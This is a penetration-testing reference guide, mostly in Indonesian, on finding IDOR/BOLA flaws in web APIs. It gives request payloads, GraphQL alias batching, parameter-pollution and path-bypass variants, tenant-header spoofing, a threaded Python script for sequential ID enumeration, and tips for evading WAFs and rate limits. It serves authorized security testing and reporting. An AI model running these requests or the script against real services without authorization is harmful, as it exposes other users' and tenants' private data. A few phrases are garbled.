# idor-bola — auth

# IDOR / BOLA Reference Guide

## 1. Referensi Cepat ID Pattern & Test Matrix

| Pola ID | Contoh | Enumerability | Bypass Difficulty | Test Priority |
|---|---|---|---|---|
| Sequential integer | `/api/v1/orders/1001` | Trivial (Burp Intruder) | Rendah | P0 |
| Sequential + offset | `/orders?offset=500` | Trivial | Rendah | P0 |
| UUID v4 | `a3bb189e-8bf9-3888-9912-ace4e6543002` | Mustahil brute force | Tidak relevan — IDOR tetap possible | P1 |
| UUID v1 (time-based) | `e2f8a1c0-...` | Tidak brute, tapi **leakable** (timestamp + MAC) | Sedang | P2 |
| Hashid / obfuscation | `/orders/MjU=` (base64 dari 25), hashids library | Trivial decode | Rendah | P0 |
| NanoID / ULID | `01ARZ3NDEKTSV4RRFFQ69G5FAV` | Mustahil | N/A | P1 |
| Nested path | `/orgs/1337/users/42/exports/9` | Enumerasi per-level | Sedang | P0 |

**Catatan hashid:** hashids-python/js decodable offline jika salt default (`""`) atau salt di bundle frontend JS. Ekstrak salt dari `app.js` / `chunk-*.js`, decode range 1–N untuk verifikasi.

```bash
# Deteksi base64/sequential di response
grep -oP '"id"\s*:\s*"[A-Za-z0-9+/=]{8,}"' resp.json | head
echo "MTAyNA==" | base64 -d   # 1024
```

---

## 2. /me vs /{id} Swap

**Apa yang dikirim:** request dengan endpoint "self-service" ganti ke endpoint absolute ID, dan sebaliknya. Authz check sering hanya dipasang di salah satu.

```
# Varian swap matrix
GET  /api/me/invoices          → 200 OK (konteks sendiri)
GET  /api/users/501/invoices   → cek apakah invoice user lain muncul
GET  /api/users/me/invoices    → kadang bypass: "me" string tidak divalidasi ownership
PUT  /api/me                   → body: {"userId": 502, "email": "attacker@x.com"}
```

**Kenapa berhasil:** routing split — `/me` ditangani middleware inject `req.user.id`, `/users/{id}` ditangani handler yang lupa cek ownership. Burp Authz / Autorize extension otomatis test kedua varian.

**Varian HTTP method swap:**

| Method di /{id} milik orang lain | Behavior umum |
|---|---|
| GET | sering diperbaiki (audit paling sering di sini) |
| PATCH / DELETE | sering **luput** — bug klasik |

```
DELETE /api/carts/8814       # milik user lain → 403
PATCH  /api/carts/8814       # same object, metadata argument bug → 200
PATCH  /api/carts/8814/owner # subresource: ownership check tidak inherited
```

---

## 3. Batch & GraphQL

### 3.1 REST Batch
Batch endpoint sering skip per-item authorization karena authz middleware jalan sekali per request, bukan per item.

```json
POST /api/v2/transactions/batch
{
  "operations": [
    {"op": "get",  "id": "txn_9001"},
    {"op": "get",  "id": "txn_9002"},
    {"op": "delete", "id": "txn_8500"}
  ]
}
```

**Kenapa berhasil:** loop internal memvalidasi input format, bukan object-level ACL.

### 3.2 GraphQL BOLA
Pola klasik (dashboard GraphQL seperti Hasura, Apollo Server, GraphQL.js):

```graphql
query {
  user(id: "501") {        # bukan currentUser!
    email
    orders { id total }
    ssn
  }
}
```

Dua root untuk test: `currentUser` (sudah scoped) vs `user(id:)` (harus ada authz directive).

**Batching attack (nested alias untuk DoS + enumeration):**

```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  ...
  a100: user(id: 100) { email }
}
```

**Kenapa berhasil:** query cost analis sering hanya hitung depth, bukan jumlah alias. Apollo `costAnalysis` di `graphql-cost-analysis@0.7.x` harus dikonfigurasi manual.

**Cek introspection:**
```bash
curl -s -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

Tools: `clairvoyance` (override introspection disabled), InQL Scanner (Burp).

---

## 4. Enumerasi via Search / Export / Report

Endpoint read-only "safe" (CSV/PDF export, search, activity log) paling sering bocor data orang lain karena dianggap non-sensitive oleh developer.

**Apa dikirim vs apa yang muncul:**

| Request | Response indikator |
|---|---|
| `GET /api/reports?type=invoice&user_id=502` | PDF milik user lain, header `Content-Disposition: invoice_502.pdf` |
| `GET /export/orders.csv?all=1` | Semua tenant data — cek parameter flag tersembunyi (`all`, `scope=admin`, `limit=-1`) |
| `GET /api/search?q=*&userId=501` | Response `total: 8412` padahal user hanya punya 3 order |
| `GET /api/audit-logs?actor=501` | Log transaksi user lain — object ref leak untuk pivot IDOR |

**Parameter probing untuk scope leak:**
```bash
for p in "userId=501" "userId=501&scope=tenant" "tenant=all" "orgId=12&all=true" "all=1" ; do
  curl -s "https://t/api/export?$p" | wc -l; done
```

---

## 5. HTTP Parameter Pollution (HPP)

**Apa yang dikirim:** parameter duplikat; framework/library berbeda ambil nilai berbeda.

| Stack | Yang dipakai |
|---|---|
| PHP / `$_GET` | **last** occurrence |
| ASP.NET `Request` | **last** |
| Express (body-parser) | mengembalikan **array** |
| Flask `request.args.get` | **first** |
| Java Spring `@RequestParam` | first |

**Payload:**
```
GET /api/orders?userId=501&userId=ATTACKER_ID
POST /api/orders  →  body: id=8814&id=92&amount=999
```

**Kenapa berhasil:** authz middleware (mis. Casbin di Express) baca `req.query.userId` pertama → owner check pass. Query DB pakai nilai terakhir → object lain diakses.

**Varian JSON pollution:**
```json
{"userId": 501, "userId": 8814}
```
Fastjson/Jackson deserialize: key duplikat last-wins (Jackson) atau first-wins tergantung config — test dua arah. Gunasiakan juga kasing beda: `userId` vs `UserID` vs `user_id` (Node normalize tidak, Java case-sensitive).

---

## 6. Object Ownership Check Hilang — Structured Detection

Urutan tes per endpoint (jangan asal random ID):

1. **Create objek milik sendiri** → catat `id`, cek atribut teknis.
2. **Request ulang objek sendiri** → baseline 200 + body shape.
3. **Request objek target** (ID user koridor/tenant lain) → bandingkan.
4. **Full matrix method × ID × content-type.**

| Kombinasi | Sinyal kritis |
|---|---|
| awal `GET /orders/{other}` → 403 | JANGAN berhenti — coba method lain, trailing dot, path varian |
| `GET /orders/8814/` vs `/orders/8814` | nginx 1.25 dengan `merge_slashes on` default + backend route yang beda → check bypass |
| `GET /api/v1/orders/8814` saat `/api/v1` deprecated | Versi lama sering tanpa authz baru. Test `/api/v1/`, `/api/v0/`, `/internal/` |
| Response 403 tapi body tetap `{"data": {...}}` | Check-response-only bug: backend kirim data, wrapper yang blokir — cek via gzip diff/response length |

**Bypass path-file:**
```
/orders/8814          → 403
/orders/8814;         → 200 (Spring Security 5.x path matching)
/orders/8814/         → 200 (Tomcat trailing slash)
/orders/8814%20       → 200
/orders/8814..;/      → traversal segment
//api/orders/8814      → proxy misroute
```

---

## 7. Tenant Isolation

IDOR lintas tenant = impact tertinggi (ES tuh data isolation contract break — lihat OWASP API1:2023 BOLA).

**Apa yang dikirim:**
```
GET /api/v1/documents/DOC-7784          # dalam tenant ID sendiri: 200
Host: app.customer-a.example.com         # tenant via subdomain
Host: app.customer-b.example.com         # request ID sama di tenant lain
```

Cek sumber tenant binding: subdomain Host header, header `X-Tenant-Id` (spoofable), session claim (aman), path `/t/{tenant}/...`.

**Payload:**
```
X-Tenant-Id: 42
X-Tenant-Id: 
# atau via HPP:
X-Tenant-Id: 7
X-Tenant-Id: 42
```

**Kenapa gagal tidak jarang:** cache key (Varnish, Cloudflare) hanya normalize path+query, tidak Host header → cache poisoning cross-tenant data via `Cache-Control` + Host hijack di setup khusus.

**Server-side enumeration:**
```bash
# Dua account tenant kecil, compare semua ref id
diff <(jq -r '..|objects|to_entries[]|select(.key|test("id";"i"))|.value' a.json) \
     <(jq -r '..|objects|to_entries[]|select(.key|test("id";"i"))|.value' b.json)
```

---

## 8. Skrip Enumerasi Sequential ID

```python
#!/usr/bin/env python3
# idor_enum.py — sequential id scan, ajv judges "leak" via diff vs baseline
import requests, sys, json
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target.example.com/api/v1/invoices/{id}"
COOKIES = {"session": "<self_session>"}
RANGE = range(9000, 10000)
BASELINE_KEYS = None  # diisi dari object milik sendiri

def check(id_):
    try:
        r = requests.get(TARGET.format(id=id_), cookies=COOKIES, timeout=10)
        if r.status_code == 200:
            body = r.json()
            # heuristic: hit kalau ada field yang bukan milik account sendiri
            if body.get("user_id") not in MY_USER_IDS:
                return (id_, r.status_code, body.get("user_id"), len(r.content))
    except Exception:
        pass
    return None

MY_USER_IDS = {501}  # semua id milik account tester
hits = []
with ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(check, RANGE):
        if res: hits.append(res); print("[HIT]", res)
print(f"Total: {len(hits)} / {len(RANGE)}")
```

Rate-limit hardening: honor `Retry-After`, jitter, throttle worker ke 3–5 agar tidak trigger WAF (Cloudflare / Akamai sering blok 429-style pattern `n+1` monotonic sequential).

---

## 9. Triage Impact Rating

| Kriteria | Signal | Rating |
|---|---|---|
| Data exposure (read-only), PII terbatas | nama+email saja | Medium (P3) |
| Read finance/health | saldo, rekening, diagnosis, dokumen | High (P2) |
| Write/Delete terhadap objek milik user lain | PATCH/DELETE sukses | High- |
| Lintas tenant, bulk (export/report) | ratusan+ record | Critical (P1) |
| Escalasi admin via object role tampering | POST/PATCH role field, kredensial | Critical (P0) |

Triage sebelum report:
1. Jumlah objek confirm exposed (katakan angka).
2. Jenis data (column header dari export).
3. Metode akses (perlu klik / batch GraphQL / scriptable).
4. Konfirmasi data asli vs dummy (lihat `created_at`, format, konsistensi DB).
5. Scope: 1 ID, 1 tenant, atau seluruh platform.

Laporan wajib: raw request/response (redacted), video/trace, coyote note ("blast radius"), mitigation pointer (lookup object by session-claimed id, bukan client-pased id).

---

## 10. Jebakan Operasional

| Jebakan | Efek | Mitigasi |
|---|---|---|
| Canary data dibuat QA semua punya | response dari account sendiri dianggap IDOR hit | Create object sendiri via UI dulu, set `MY_USER_IDS` |
| Sequential monotonic scan | Cloudflare bot challenge / WAF validator 429 | Random permutation list(range), jitter, User-Agent asli Chrome 131, low concurrency |
| Test di staging environment | dev "sudah aware", duplikasi ID hole, finding tidak representatif | Verify di prod environment kapan pun bisa; prod sering memiliki code path identik tapi patch drift |
| UUID dianggap "bukan IDOR" | filter out temuan; UUID leak via export/GraphQL relations/ref links | Dapatkan UUID via search/report endpoint → IDOR tetap berjalan |
| ID sumber RPC dalam protobuf/gRPC-web binary | script curl-based gagal decode | Parse dengan `grpcurl` atau decompile `tugu-web` client libs |
| Authz middleware hanya jalan di 1 route tier | tidak menemukan IDOR karena hanya test endpoint sama yang terproteksi | Fuzz routing varian: version, method, nested/dotted path |
| Spoofed `X-Tenant-Id` diaplikasikan saat render PDF/rsync worker async | data di-cache, delayed render "tidak terlihat leak" sulit konfirm | Cek s3/signed URL output jobs, tunggu worker render |
| Lupa redact third-party PII dalam report/report chat | temuan jadi insiden compliance terpisah | Masking di note, simpan evidences di internal vault saja |
| 403 response basi dari gateway tapi backend processing async side effect tetap terjadi (log, audit, resource) | DELETE "403" ternyata benar-benar delete | selalu re-verify object state with GET setelah tes DELETE |

---

## [reasoning trace]


